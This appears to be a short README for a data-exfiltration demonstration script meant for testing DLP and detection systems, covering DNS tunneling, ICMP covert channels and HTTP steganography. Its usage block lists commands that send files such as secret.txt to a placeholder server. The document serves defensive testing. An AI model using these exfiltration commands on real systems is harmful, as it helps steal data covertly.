## over

data exfiltration technique demonstrations for testing dlp systems. educational tool that demonstrates dns tunneling, icmp covert channels, and http steganography.

### usage

```
./over.sh -m dns -t your-server.com -d secret.txt -a <auth_token>
./over.sh -m icmp -t 10.0.0.1 -d data.bin -a <auth_token>
./over.sh -m http -t your-server.com -d file.txt -a <auth_token>
```

### options

- `-m` : exfil mode (dns, icmp, http)
- `-t` : target server (must be own infrastructure)
- `-d` : data file to exfiltrate
- `-a` : authorization token (required, min 16 chars)

### safety

authorization token is required for all operations. only use against your own infrastructure. intended for testing dlp and detection systems.
